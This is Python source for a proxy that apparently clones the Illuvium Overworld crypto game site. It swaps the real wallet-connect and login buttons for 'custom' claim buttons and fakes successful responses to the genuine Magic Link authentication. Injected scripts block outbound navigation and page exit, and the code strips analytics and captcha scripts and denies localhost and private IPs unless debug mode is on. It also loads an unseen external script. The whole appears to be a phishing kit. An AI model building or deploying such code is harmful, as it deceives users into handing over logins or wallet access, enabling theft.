import os
import sys
import logging
import traceback
import re
from urllib.parse import parse_qs, urlparse
import mimetypes
import urllib.parse
import requests
from urllib.parse import urljoin
import io
import time
import json
from datetime import datetime
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
import gzip
from ip_validator import DEBUG_MODE

# Configure logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Original site URL
ORIGINAL_SITE = "https://overworld.illuvium.io"

# Custom function to get client IP from WSGI environment
def get_client_ip_wsgi(environ):
    """
    Extract the client IP address from the WSGI environment.
    
    Args:
        environ: The WSGI environment dictionary
        
    Returns:
        str: The client IP address
    """
    # Try to get IP from various WSGI environment variables
    if 'HTTP_CLIENT_IP' in environ:
        return environ['HTTP_CLIENT_IP']
    
    if 'HTTP_X_FORWARDED_FOR' in environ:
        # X-Forwarded-For can contain multiple IPs, take the first one
        return environ['HTTP_X_FORWARDED_FOR'].split(',')[0].strip()
    
    if 'HTTP_X_REAL_IP' in environ:
        return environ['HTTP_X_REAL_IP']
    
    # Fall back to the remote address
    return environ.get('REMOTE_ADDR', '127.0.0.1')

def validate_ip(client_ip, original_site):
    """
    Validate if the client IP should be allowed to access the site.
    
    Args:
        client_ip: The client's IP address
        original_site: The original site URL
        
    Returns:
        bool: True if access should be denied, False if allowed
    """
    # Allow access in debug mode for local IPs
    if DEBUG_MODE:
        local_ips = ["127.0.0.1", "::1"]
        if client_ip in local_ips or client_ip.startswith(("192.168.", "10.")):
            logger.info(f"DEBUG MODE: Allowing access for local IP: {client_ip}")
            return False
    
    # List of IPs or IP ranges to block
    blocked_ips = [
        '127.0.0.1',  # Localhost
        '::1',        # IPv6 localhost
        '192.168.',   # Private network
        '10.',        # Private network
        '172.16.',    # Private network
        '172.17.',    # Private network
        '172.18.',    # Private network
        '172.19.',    # Private network
        '172.20.',    # Private network
        '172.21.',    # Private network
        '172.22.',    # Private network
        '172.23.',    # Private network
        '172.24.',    # Private network
        '172.25.',    # Private network
        '172.26.',    # Private network
        '172.27.',    # Private network
        '172.28.',    # Private network
        '172.29.',    # Private network
        '172.30.',    # Private network
        '172.31.'     # Private network
    ]
    
    # Check if the IP is in the blocked list
    for blocked_ip in blocked_ips:
        if client_ip.startswith(blocked_ip):
            logger.warning(f"Access denied for blocked IP: {client_ip}")
            return True
    
    return False

class RequestDebugger:
    def __init__(self):
        self.logger = logging.getLogger('RequestDebugger')
        self.logger.setLevel(logging.DEBUG)
        self.request_count = 0
        self.lock = threading.Lock()
        
        # Create debug log directory if it doesn't exist
        self.debug_dir = 'debug_logs'
        if not os.path.exists(self.debug_dir):
            os.makedirs(self.debug_dir)
            
        # Create debug log file with timestamp
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.debug_file = os.path.join(self.debug_dir, f'debug_{timestamp}.log')
        
        # Configure file handler
        fh = logging.FileHandler(self.debug_file)
        fh.setLevel(logging.DEBUG)
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        fh.setFormatter(formatter)
        self.logger.addHandler(fh)
        
    def log_request(self, environ, response=None, error=None):
        with self.lock:
            self.request_count += 1
            request_id = self.request_count
            
            # Log request details
            self.logger.debug(f"\n{'='*80}\nRequest #{request_id}")
            self.logger.debug(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            self.logger.debug(f"Method: {environ.get('REQUEST_METHOD', '')}")
            self.logger.debug(f"Path: {environ.get('PATH_INFO', '')}")
            self.logger.debug(f"Query: {environ.get('QUERY_STRING', '')}")
            self.logger.debug(f"Headers: {dict(environ)}")
            
            # Log request body if present
            try:
                content_length = int(environ.get('CONTENT_LENGTH', 0))
                if content_length > 0:
                    request_body = environ['wsgi.input'].read(content_length)
                    environ['wsgi.input'] = io.BytesIO(request_body)  # Reset stream
                    self.logger.debug(f"Request Body: {request_body.decode('utf-8', errors='ignore')}")
            except Exception as e:
                self.logger.debug(f"Error reading request body: {str(e)}")
            
            # Log response or error
            if response:
                self.logger.debug(f"\nResponse Status: {response.status_code}")
                self.logger.debug(f"Response Headers: {dict(response.headers)}")
                try:
                    self.logger.debug(f"Response Body: {response.text[:1000]}...")  # First 1000 chars
                except:
                    self.logger.debug("Response Body: [Binary data]")
            
            if error:
                self.logger.error(f"Error: {str(error)}")
                self.logger.error(f"Error Type: {type(error)}")
                self.logger.error(f"Error Traceback: {error.__traceback__}")
            
            self.logger.debug(f"{'='*80}\n")

# Initialize debugger
debugger = RequestDebugger()

class WSGIHandler:
    def __init__(self):
        # Get the absolute path of the current directory
        current_dir = os.path.dirname(os.path.abspath(__file__))
        self.directory = os.path.join(current_dir, 'App_files', 'Assets')
        logger.info(f"Initialized with directory: {self.directory}")
        
        # Create directory if it doesn't exist
        os.makedirs(self.directory, exist_ok=True)
        
        self.debug_mode = True
        self.session_id = str(int(time.time()))
        logger.info(f"Session debugger started - ID: {self.session_id}")
        self.session = requests.Session()
        self.session.verify = False
        self.original_site = "https://overworld.illuvium.io"
        self.debugger = debugger

    def rewrite_urls(self, content):
        """Rewrite URLs to point to proxy server."""
        if isinstance(content, bytes):
            content = content.decode('utf-8', errors='ignore')

        # Fix malformed URLs with double semicolons
        content = re.sub(r'https;//', 'https://', content)

        # Fix Next.js image URLs
        def nextjs_image_replacer(match):
            url = match.group(0)
            # Convert _next/image?url=<encoded>&w=<width>&q=<quality> 
            # to appropriate local URL
            if '_next/image' in url and 'url=' in url:
                try:
                    # Extract the original URL
                    parsed = urllib.parse.urlparse(url)
                    params = urllib.parse.parse_qs(parsed.query)
                    if 'url' in params:
                        original_url = urllib.parse.unquote(params['url'][0])
                        # Make relative URLs absolute
                        if original_url.startswith('/'):
                            original_url = f"App_files/Assets{original_url}"
                        return original_url
                except Exception as e:
                    logger.error(f"Error processing Next.js image URL: {e}")
            return url

        # Replace Next.js image URLs
        content = re.sub(r'/_next/image\?[^"\']+', nextjs_image_replacer, content)
        
        # Fix autodrone.html references
        content = content.replace('autodrone.html', '/autodrone.html')
        
        # Add leading slashes to resources that need them
        content = re.sub(r'src="(?!https?://|/|data:|#)([^"]+)"', r'src="/\1"', content)
        content = re.sub(r'href="(?!https?://|/|data:|#|javascript:|mailto:)([^"]+)"', r'href="/\1"', content)

        # Original URL rewriting logic
        content = content.replace('href="/', 'href="/proxy/')
        content = content.replace('src="/', 'src="/proxy/')
        content = content.replace("href='/", "href='/proxy/")
        content = content.replace("src='/", "src='/proxy/")
        
        # Fix double proxy issues
        content = content.replace('/proxy/proxy/', '/proxy/')
        
        return content.encode('utf-8') if isinstance(content, str) else content

    def modify_buttons_and_links(self, content):
        """Modify button and link elements in HTML content."""
        if isinstance(content, bytes):
            content = content.decode('utf-8', errors='ignore')
        
        logger.info(f"[{self.session_id}] Modifying buttons and links")
        
        # Button patterns
        button_patterns = [
            # Chakra UI button text replacements
            (r'<button[^>]*class="[^"]*chakra-button[^"]*"[^>]*>Play for Free</button>', 
             '<button type="button" class="chakra-button css-1253haw claim-button" data-click="start-game">Start Game</button>'),
            (r'<button[^>]*class="[^"]*chakra-button[^"]*"[^>]*>Log In with Passport</button>', 
             '<button type="button" class="chakra-button css-1253haw claim-button" data-click="custom-login">Custom Login</button>'),
            (r'<button[^>]*class="[^"]*chakra-button[^"]*"[^>]*>Connect Wallet</button>', 
             '<button type="button" class="chakra-button css-1253haw claim-button" data-click="custom-connect">Custom Connect</button>'),
            (r'<button[^>]*class="[^"]*chakra-button[^"]*"[^>]*>Play Now</button>', 
             '<button type="button" class="chakra-button css-1253haw claim-button" data-click="start-game">Start Game</button>'),
            
            # Remove click handlers from Chakra buttons
            (r'<button[^>]*class="[^"]*chakra-button[^"]*"[^>]*onclick="[^"]*"[^>]*>', 
             lambda m: m.group(0).replace('onclick="', 'data-click="')),
            (r'<button[^>]*class="[^"]*chakra-button[^"]*"[^>]*onClick="[^"]*"[^>]*>', 
             lambda m: m.group(0).replace('onClick="', 'data-click="')),
            
            # Remove navigation attributes from Chakra buttons
            (r'<button[^>]*class="[^"]*chakra-button[^"]*"[^>]*href="[^"]*"[^>]*>', 
             lambda m: m.group(0).replace('href="', 'data-href="')),
            (r'<button[^>]*class="[^"]*chakra-button[^"]*"[^>]*to="[^"]*"[^>]*>', 
             lambda m: m.group(0).replace('to="', 'data-to="')),
            
            # Block Epic Games store links in Chakra buttons
            (r'<button[^>]*class="[^"]*chakra-button[^"]*"[^>]*href="https://store\.epicgames\.com/en-US/p/illuvium-60064c"[^>]*>', 
             '<button type="button" class="chakra-button css-1253haw claim-button" data-href="javascript:void(0)" data-click="start-game">Start Game</button>'),
            (r'<button[^>]*class="[^"]*chakra-button[^"]*"[^>]*href="com\.epicgames\.launcher://store/product/illuvium-60064c"[^>]*>', 
             '<button type="button" class="chakra-button css-1253haw claim-button" data-href="javascript:void(0)" data-click="start-game">Start Game</button>'),
            
            # Add modified class to Chakra buttons
            (r'<button[^>]*class="([^"]*chakra-button[^"]*)"[^>]*>', 
             lambda m: m.group(0).replace('class="', 'class="claim-button ')),
        ]
        
        # Apply patterns and log changes
        for pattern, replacement in button_patterns:
            matches = re.findall(pattern, content)
            if matches:
                logger.info(f"[{self.session_id}] Found {len(matches)} button matches for pattern: {pattern}")
                content = re.sub(pattern, replacement, content)
        
        # Add click handler script
        content = content.replace('</body>', '''
            <script>
                // Debug logging function
                function debugLog(type, message, data = {}) {
                    const timestamp = new Date().toISOString();
                    console.log(`[${timestamp}] ${type}: ${message}`, data);
                }

                // Block all protocol handlers
                function blockProtocolHandlers() {
                    // Block registerProtocolHandler
                    navigator.registerProtocolHandler = function() {
                        debugLog('Protocol', 'Blocked protocol handler registration');
                        return false;
                    };

                    // Block custom protocols via links
                    document.addEventListener('click', function(e) {
                        const target = e.target.closest('a');
                        if (target && target.href) {
                            const url = target.href.toLowerCase();
                            if (url.startsWith('com.epicgames') || 
                                url.startsWith('epicgames') || 
                                url.includes('store.epicgames.com') ||
                                url.includes('launcher://') ||
                                url.includes('illuvium-60064c')) {
                                debugLog('Protocol', 'Blocked custom protocol link', { url });
                                e.preventDefault();
                                e.stopPropagation();
                                return false;
                            }
                        }
                    }, true);
                }

                // Block all storage access
                function blockStorageAccess() {
                    const domains = ['store.epicgames.com', 'auth.magic.link', 'google.com'];
                    
                    // Override storage APIs
                    domains.forEach(domain => {
                        Object.defineProperty(window, 'localStorage', {
                            get: function() {
                                if (document.referrer.includes(domain)) {
                                    debugLog('Storage', `Blocked localStorage access from ${domain}`);
                                    return {
                                        getItem: () => null,
                                        setItem: () => {},
                                        removeItem: () => {},
                                        clear: () => {}
                                    };
                                }
                                return window.localStorage;
                            }
                        });

                        Object.defineProperty(window, 'sessionStorage', {
                            get: function() {
                                if (document.referrer.includes(domain)) {
                                    debugLog('Storage', `Blocked sessionStorage access from ${domain}`);
                                    return {
                                        getItem: () => null,
                                        setItem: () => {},
                                        removeItem: () => {},
                                        clear: () => {}
                                    };
                                }
                                return window.sessionStorage;
                            }
                        });
                    });
                }

                // Block all redirects and navigation
                function blockAllNavigation() {
                    const blockedDomains = [
                        'store.epicgames.com',
                        'auth.magic.link',
                        'google.com',
                        'epicgames.com',
                        'illuvium-60064c'
                    ];

                    const blockedProtocols = [
                        'com.epicgames',
                        'epicgames',
                        'launcher'
                    ];

                    function isBlockedUrl(url) {
                        if (!url) return false;
                        url = url.toLowerCase();
                        return blockedDomains.some(domain => url.includes(domain)) ||
                               blockedProtocols.some(protocol => url.startsWith(protocol));
                    }

                    // Override window.open
                    const originalOpen = window.open;
                    window.open = function(url, ...args) {
                        if (isBlockedUrl(url)) {
                            debugLog('Navigation', 'Blocked window.open', {url});
                            return null;
                        }
                        return originalOpen.apply(this, arguments);
                    };

                    // Override location methods
                    ['href', 'assign', 'replace', 'reload'].forEach(prop => {
                        Object.defineProperty(window.location, prop, {
                            configurable: true,
                            get: function() {
                                return function(url) {
                                    if (isBlockedUrl(url)) {
                                        debugLog('Navigation', `Blocked location.${prop}`, {url});
                                        return false;
                                    }
                                };
                            },
                            set: function(url) {
                                if (isBlockedUrl(url)) {
                                    debugLog('Navigation', `Blocked setting location.${prop}`, {url});
                                    return false;
                                }
                            }
                        });
                    });

                    // Block history methods
                    ['pushState', 'replaceState'].forEach(method => {
                        const original = window.history[method];
                        window.history[method] = function(state, title, url) {
                            if (isBlockedUrl(url)) {
                                debugLog('Navigation', `Blocked history.${method}`, {url});
                                return;
                            }
                            return original.apply(this, arguments);
                        };
                    });

                    // Block form submissions
                    document.addEventListener('submit', function(e) {
                        const form = e.target;
                        const action = form.action || '';
                        if (isBlockedUrl(action)) {
                            debugLog('Form', 'Blocked form submission', {action});
                            e.preventDefault();
                            return false;
                        }
                    }, true);
                }

                // Initialize everything when the DOM is ready
                document.addEventListener('DOMContentLoaded', function() {
                    debugLog('Init', 'Starting security measures');
                    
                    // Block protocol handlers first
                    blockProtocolHandlers();
                    
                    // Block storage access
                    blockStorageAccess();
                    
                    // Block navigation
                    blockAllNavigation();
                    
                    // Setup button handlers
                    setupButtonHandlers();
                    
                    // Watch for dynamic content
                    const observer = new MutationObserver(function(mutations) {
                        mutations.forEach(function(mutation) {
                            if (mutation.addedNodes.length) {
                                setupButtonHandlers();
                            }
                        });
                    });
                    
                    observer.observe(document.body, {
                        childList: true,
                        subtree: true
                    });

                    debugLog('Init', 'Security measures initialized');
                });

                // Block any remaining redirects
                window.addEventListener('beforeunload', function(e) {
                    e.preventDefault();
                    e.returnValue = '';
                    return false;
                }, true);

                // Block popups
                window.addEventListener('popup', function(e) {
                    e.preventDefault();
                    return false;
                }, true);

                // Additional security: Override window.postMessage
                const originalPostMessage = window.postMessage;
                window.postMessage = function(message, targetOrigin, transfer) {
                    if (targetOrigin === '*' || 
                        targetOrigin.includes('epicgames.com') || 
                        targetOrigin.includes('auth.magic.link')) {
                        debugLog('Security', 'Blocked postMessage', {targetOrigin});
                        return;
                    }
                    return originalPostMessage.apply(this, arguments);
                };
            </script>
            </body>
        ''')
        
        return content.encode('utf-8') if isinstance(content, str) else content

    def process_js_file(self, content, path):
        """Process JavaScript files for debugging and linting"""
        if isinstance(content, bytes):
            content_str = content.decode('utf-8', errors='ignore')
        else:
            content_str = content
            
        logger.info(f"[{self.session_id}] Processing JS file: {path}")

        try:
            # Transform any Google redirect URLs in the content
            redirect_patterns = [
                # Direct URL assignments
                (r'window\.location(?:\.href)?\s*=\s*[\'"]https?://(?:www\.)?google\.com[^\'"]*[\'"]', 'window.location.href="#"'),
                (r'window\.location(?:\.href)?\s*=\s*[\'"]https?://(?:www\.)?google\.[^\'"]*[\'"]', 'window.location.href="#"'),
                
                # Function calls with Google URLs
                (r'\.navigate\s*\(\s*[\'"]https?://(?:www\.)?google\.[^\'"]*[\'"]\s*\)', '.navigate("#")'),
                (r'\.redirect\s*\(\s*[\'"]https?://(?:www\.)?google\.[^\'"]*[\'"]\s*\)', '.redirect("#")'),
                
                # Router pushes with Google URLs
                (r'router\.push\s*\(\s*[\'"]https?://(?:www\.)?google\.[^\'"]*[\'"]\s*\)', 'router.push("#")'),
                (r'router\.replace\s*\(\s*[\'"]https?://(?:www\.)?google\.[^\'"]*[\'"]\s*\)', 'router.replace("#")'),
                
                # String literals containing Google URLs
                (r'[\'"]https?://(?:www\.)?google\.com/[^\'"]*[\'"]', '"#"'),
                (r'[\'"]https?://(?:www\.)?google\.[^\'"]*[\'"]', '"#"'),
                
                # URL encoded Google URLs
                (r'encodeURIComponent\s*\(\s*[\'"]https?://(?:www\.)?google\.[^\'"]*[\'"]\s*\)', 'encodeURIComponent("#")'),
                (r'escape\s*\(\s*[\'"]https?://(?:www\.)?google\.[^\'"]*[\'"]\s*\)', 'escape("#")'),
            ]

            # Apply all redirect blocking patterns
            for pattern, replacement in redirect_patterns:
                content_str = re.sub(pattern, replacement, content_str, flags=re.IGNORECASE)

            # Add URL transformation script for dynamic content
            url_transform_script = '''
                // Transform Google redirect URLs
                (function() {
                    const originalURL = window.URL;
                    const originalURLSearchParams = window.URLSearchParams;

                    // Override URL constructor
                    window.URL = function(url, base) {
                        if (typeof url === 'string') {
                            // Transform any Google URLs
                            if (url.toLowerCase().includes('google.com') || 
                                url.toLowerCase().match(/google\.[a-z]+/)) {
                                console.log('Transformed Google URL:', url);
                                url = '#';
                            }
                        }
                        return new originalURL(url, base);
                    };
                    window.URL.prototype = originalURL.prototype;
                    window.URL.createObjectURL = originalURL.createObjectURL;
                    window.URL.revokeObjectURL = originalURL.revokeObjectURL;

                    // Override URLSearchParams to remove Google redirects
                    window.URLSearchParams = function(init) {
                        const params = new originalURLSearchParams(init);
                        const originalGet = params.get;
                        const originalGetAll = params.getAll;
                        
                        params.get = function(name) {
                            const value = originalGet.call(this, name);
                            if (value && typeof value === 'string' &&
                                (value.includes('google.com') || value.match(/google\.[a-z]+/))) {
                                console.log('Blocked Google redirect in URL param:', name);
                                return '#';
                            }
                            return value;
                        };
                        
                        params.getAll = function(name) {
                            const values = originalGetAll.call(this, name);
                            return values.map(value => {
                                if (value && typeof value === 'string' &&
                                    (value.includes('google.com') || value.match(/google\.[a-z]+/))) {
                                    console.log('Blocked Google redirect in URL param array:', name);
                                    return '#';
                                }
                                return value;
                            });
                        };
                        
                        return params;
                    };
                    window.URLSearchParams.prototype = originalURLSearchParams.prototype;
                })();
            '''

            # Only add the transform script to non-framework files
            if not any(x in path for x in [
                'framework-', 'webpack-', 'main-', 'pages/_app-', 'pages/index-',
                'reactPlayerFilePlayer', '_buildManifest', '_ssgManifest'
            ]):
                content_str = url_transform_script + content_str

            return content_str.encode('utf-8')
            
        except Exception as e:
            logger.error(f"[{self.session_id}] Error processing JS file: {str(e)}")
            logger.error(traceback.format_exc())
            return content.encode('utf-8') if isinstance(content, str) else content

    def modify_text_content(self, content):
        """Replace text content in HTML elements using JavaScript."""
        if isinstance(content, bytes):
            content = content.decode('utf-8', errors='ignore')
            
        logger.info("Adding text replacement functionality")
        
        # JavaScript to replace text in elements matching a selector
        text_replacement_script = '''
        <script>
        // Function to replace text in elements matching a selector
        function replaceTextInElements(selector, originalText, newText, exactMatch = false) {
            const elements = document.querySelectorAll(selector);
            elements.forEach(element => {
                if (exactMatch) {
                    if (element.textContent.trim() === originalText) {
                        element.textContent = newText;
                    }
                } else {
                    if (element.textContent.includes(originalText)) {
                        element.textContent = element.textContent.replace(originalText, newText);
                    }
                }
            });
            console.log(`Replaced "${originalText}" with "${newText}" in ${elements.length} elements matching "${selector}"`);
        }
        
        // Function to replace all instances of text across the entire page
        function replaceAllTextOnPage(originalText, newText) {
            const walker = document.createTreeWalker(
                document.body, 
                NodeFilter.SHOW_TEXT, 
                null, 
                false
            );
            
            let node;
            let count = 0;
            
            while (node = walker.nextNode()) {
                if (node.nodeValue.includes(originalText)) {
                    node.nodeValue = node.nodeValue.replace(new RegExp(originalText, 'g'), newText);
                    count++;
                }
            }
            
            console.log(`Replaced all instances of "${originalText}" with "${newText}" (${count} text nodes affected)`);
        }
        
        // Apply replacements when the page is fully loaded
        window.addEventListener('load', function() {
            // Wait for all dynamic content to render
            setTimeout(function() {
                // Replace specific text elements
                
                // Example replacements
                replaceTextInElements('h1, h2, h3, h4, h5', 'Illuvium', 'My Game', false);
                replaceTextInElements('button, a.chakra-button', 'Play Now', 'Start Game', true);
                replaceTextInElements('button, a.chakra-button', 'Claim', 'Get Reward', false);
                replaceTextInElements('button, a.chakra-button', 'Connect', 'Link Account', false);
                
                // Global replacements across all text nodes
                replaceAllTextOnPage('Passport', 'Account');
                replaceAllTextOnPage('wallet', 'account');
                
                console.log('Text replacement complete');
            }, 2000); // Delay to ensure app is fully loaded
        });
        </script>
        '''
        
        # Insert text replacement script before the closing body tag
        if '</body>' in content:
            content = content.replace('</body>', f'{text_replacement_script}</body>')
        
        return content.encode('utf-8')

    # Added function that was in server.py to remove tracking scripts
    def remove_tracking_scripts(self, content):
        """Remove Google Tag Manager iframe and tracking scripts from HTML content."""
        if isinstance(content, bytes):
            content = content.decode('utf-8', errors='ignore')
        
        # Remove GTM iframe
        content = content.replace(
            '<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WXHP66L" height="0" width="0" style="display:none;visibility:hidden"></iframe>',
            ''
        )
        
        # Remove GTM script
        content = content.replace(
            '<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-B4V7XNT23Z"></script>',
            ''
        )
        
        # Remove GTM initialization script
        gtm_init_script = '''<script>
            window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
            gtag('config', 'G-B4V7XNT23Z', {
              page_path: window.location.pathname,
            });
          </script>'''
        content = content.replace(gtm_init_script, '')
        
        # Remove GTM inline script
        gtm_inline_script = '''<script>
            (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
            new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
            j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
            'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
            })(window,document,'script','dataLayer', 'GTM-WXHP66L');
          </script>'''
        content = content.replace(gtm_inline_script, '')
        
        # Remove Geetest script
        content = content.replace(
            '<script async="" src="https://static.geetest.com/v4/gt4.js"></script>',
            ''
        )
        
        return content.encode('utf-8')

    def inject_load_complete_script(self, content):
        """Inject load-complete.js script into HTML content."""
        if isinstance(content, bytes):
            content = content.decode('utf-8', errors='ignore')
        
        # Find the closing </body> tag
        if '</body>' in content:
            try:
                # Read the load-complete.js file
                with open('load-complete.js', 'r') as f:
                    script_content = f.read()
                # Inject the script before the closing body tag
                content = content.replace('</body>', f'<script>{script_content}</script></body>')
            except Exception as e:
                logger.error(f"Error reading load-complete.js: {str(e)}")
    
        return content.encode('utf-8')
    
    def modify_chunk_content(self, content):
        """Modify JavaScript chunk content to replace specific text patterns."""
        if isinstance(content, bytes):
            content = content.decode('utf-8', errors='ignore')
        
        logger.info(f"[{self.session_id}] Modifying chunk content")
        
        # Skip modification for React framework chunks
        if 'framework-d5719ebbbcec5741.js' in content:
            logger.info(f"[{self.session_id}] Skipping React framework chunk")
            return content.encode('utf-8')
        
        try:
            # Find and replace any redirect logic in chunks
            redirect_patterns = [
                # Direct URL assignments
                (r'window\.location(?:\.href)?\s*=\s*[\'"]https?://[^\'"]*epicgames[^\'"]*[\'"]', 'window.location.href="#"'),
                (r'window\.location(?:\.href)?\s*=\s*[\'"]com\.epicgames[^\'"]*[\'"]', 'window.location.href="#"'),
                
                # Function calls that might cause redirects
                (r'window\.open\([\'"]https?://[^\'"]*epicgames[^\'"]*[\'"]\s*[,)]', 'window.open("#")'),
                (r'window\.open\([\'"]com\.epicgames[^\'"]*[\'"]\s*[,)]', 'window.open("#")'),
                
                # Navigation method calls
                (r'\.navigate\s*\(\s*[\'"]https?://[^\'"]*epicgames[^\'"]*[\'"]\s*\)', '.navigate("#")'),
                (r'\.navigate\s*\(\s*[\'"]com\.epicgames[^\'"]*[\'"]\s*\)', '.navigate("#")'),
                
                # History API calls
                (r'history\.pushState[^;]*[\'"]https?://[^\'"]*epicgames[^\'"]*[\'"]\s*[,)]', 'history.pushState(null, "", "#")'),
                (r'history\.replaceState[^;]*[\'"]https?://[^\'"]*epicgames[^\'"]*[\'"]\s*[,)]', 'history.replaceState(null, "", "#")'),
                
                # Router pushes
                (r'router\.push\s*\(\s*[\'"]https?://[^\'"]*epicgames[^\'"]*[\'"]\s*\)', 'router.push("#")'),
                (r'router\.replace\s*\(\s*[\'"]https?://[^\'"]*epicgames[^\'"]*[\'"]\s*\)', 'router.replace("#")'),
                
                # Async navigation
                (r'await\s+navigate\s*\(\s*[\'"]https?://[^\'"]*epicgames[^\'"]*[\'"]\s*\)', 'await navigate("#")'),
                
                # Direct protocol handlers
                (r'[\'"]com\.epicgames://[^\'"]*[\'"]', '"#"'),
                (r'[\'"]epicgames://[^\'"]*[\'"]', '"#"'),
                
                # Function definitions that might handle redirects
                (r'function\s+handleRedirect\s*\([^)]*\)\s*{[^}]*epicgames[^}]*}', 'function handleRedirect() { return false; }'),
                (r'const\s+handleRedirect\s*=\s*[^=>]*=>\s*{[^}]*epicgames[^}]*}', 'const handleRedirect = () => false;'),
                
                # Event handlers
                (r'onClick\s*=\s*{\s*[^}]*(?:epicgames|store\.epicgames\.com)[^}]*}', 'onClick={e => { e.preventDefault(); return false; }}'),
                (r'onSubmit\s*=\s*{\s*[^}]*(?:epicgames|store\.epicgames\.com)[^}]*}', 'onSubmit={e => { e.preventDefault(); return false; }}'),
            ]
            
            # Apply all redirect blocking patterns
            for pattern, replacement in redirect_patterns:
                content = re.sub(pattern, replacement, content, flags=re.IGNORECASE)
            
            # Add navigation blocking wrapper
            navigation_blocker = '''
                // Navigation blocking wrapper
                (function() {
                    const blockedDomains = [
                        'store.epicgames.com',
                        'epicgames.com',
                        'launcher://',
                        'com.epicgames',
                        'illuvium-60064c'
                    ];
                    
                    function isBlockedUrl(url) {
                        return blockedDomains.some(domain => 
                            url && url.toLowerCase().includes(domain.toLowerCase())
                        );
                    }
                    
                    // Override navigation methods
                    const _open = window.open;
                    window.open = function(url) {
                        if (isBlockedUrl(url)) return null;
                        return _open.apply(this, arguments);
                    };
                    
                    const _assign = window.location.assign;
                    window.location.assign = function(url) {
                        if (isBlockedUrl(url)) return false;
                        return _assign.apply(this, arguments);
                    };
                    
                    const _replace = window.location.replace;
                    window.location.replace = function(url) {
                        if (isBlockedUrl(url)) return false;
                        return _replace.apply(this, arguments);
                    };
                    
                    // Override history methods
                    const _pushState = history.pushState;
                    history.pushState = function(state, title, url) {
                        if (isBlockedUrl(url)) return;
                        return _pushState.apply(this, arguments);
                    };
                    
                    const _replaceState = history.replaceState;
                    history.replaceState = function(state, title, url) {
                        if (isBlockedUrl(url)) return;
                        return _replaceState.apply(this, arguments);
                    };
                    
                    // Block setting location.href
                    Object.defineProperty(window.location, 'href', {
                        set: function(url) {
                            if (isBlockedUrl(url)) return false;
                            return url;
                        }
                    });
                })();
            '''
            
            # Insert the navigation blocker at the start of the chunk
            content = navigation_blocker + content
            
            # Add error handler to catch and block any remaining redirects
            error_handler = '''
                window.addEventListener('error', function(e) {
                    if (e && e.target && e.target.tagName === 'SCRIPT') {
                        if (e.target.src && (
                            e.target.src.includes('epicgames.com') ||
                            e.target.src.includes('launcher://') ||
                            e.target.src.includes('com.epicgames')
                        )) {
                            e.preventDefault();
                            return true;
                        }
                    }
                }, true);
            '''
            
            # Add the error handler at the end of the chunk
            content = content + error_handler
            
            # Add fetch request blocking wrapper
            fetch_blocker = '''
                // Block specific Magic Link authentication request
                (function() {
                    const originalFetch = window.fetch;
                    window.fetch = async function(resource, init) {
                        const url = resource instanceof Request ? resource.url : resource;
                        
                        // Check if it's the Magic Link auth request
                        if (url && url.includes('auth.magic.link/send?params=')) {
                            console.log('Blocked Magic Link authentication request:', url);
                            
                            // Return a mock successful response
                            return new Response(JSON.stringify({
                                success: true,
                                blocked: true,
                                message: 'Authentication request blocked'
                            }), {
                                status: 200,
                                headers: {
                                    'Content-Type': 'application/json',
                                    'Access-Control-Allow-Origin': '*'
                                }
                            });
                        }

                        // Also block any request with specific headers matching Magic Link auth
                        if (init && init.headers) {
                            const headers = new Headers(init.headers);
                            if (headers.get('Sec-Fetch-Dest') === 'iframe' && 
                                headers.get('Sec-Fetch-Mode') === 'navigate' &&
                                headers.get('Upgrade-Insecure-Requests') === '1' &&
                                url.includes('auth.magic.link')) {
                                console.log('Blocked Magic Link iframe request:', url);
                                return new Response('', { status: 204 });
                            }
                        }

                        return originalFetch.apply(this, arguments);
                    };

                    // Also block XHR requests to Magic Link
                    const originalXHR = window.XMLHttpRequest;
                    function BlockingXHR() {
                        const xhr = new originalXHR();
                        const originalOpen = xhr.open;

                        xhr.open = function(method, url, ...args) {
                            if (url && url.includes('auth.magic.link/send?params=')) {
                                console.log('Blocked Magic Link XHR request:', url);
                                Object.defineProperty(this, 'readyState', { value: 4 });
                                Object.defineProperty(this, 'status', { value: 200 });
                                Object.defineProperty(this, 'responseText', {
                                    value: JSON.stringify({
                                        success: true,
                                        blocked: true
                                    })
                                });
                                this.send = function() {
                                    setTimeout(() => {
                                        if (this.onreadystatechange) {
                                            this.onreadystatechange();
                                        }
                                        if (this.onload) {
                                            this.onload();
                                        }
                                    }, 0);
                                };
                                return;
                            }
                            return originalOpen.apply(this, arguments);
                        };

                        return xhr;
                    }
                    window.XMLHttpRequest = BlockingXHR;

                    // Block iframe creation for Magic Link
                    const observer = new MutationObserver((mutations) => {
                        mutations.forEach((mutation) => {
                            mutation.addedNodes.forEach((node) => {
                                if (node.tagName === 'IFRAME') {
                                    const src = node.src || '';
                                    if (src.includes('auth.magic.link')) {
                                        console.log('Blocked Magic Link iframe:', src);
                                        node.remove();
                                    }
                                }
                            });
                        });
                    });

                    observer.observe(document.documentElement, {
                        childList: true,
                        subtree: true
                    });

                    // Block form submissions to Magic Link
                    document.addEventListener('submit', function(e) {
                        const form = e.target;
                        const action = form.action || '';
                        if (action.includes('auth.magic.link')) {
                            console.log('Blocked Magic Link form submission:', action);
                            e.preventDefault();
                            return false;
                        }
                    }, true);

                    // Block window messages from Magic Link
                    window.addEventListener('message', function(e) {
                        if (e.origin.includes('auth.magic.link')) {
                            console.log('Blocked Magic Link message:', e.origin);
                            e.stopImmediatePropagation();
                            return false;
                        }
                    }, true);
                })();
            '''

            # Add the fetch blocker at the start of the content
            content = fetch_blocker + content
            
            return content.encode('utf-8')
            
        except Exception as e:
            logger.error(f"[{self.session_id}] Error modifying chunk: {str(e)}")
            logger.error(traceback.format_exc())
            # Return original content if modification fails
            return content.encode('utf-8') if isinstance(content, str) else content

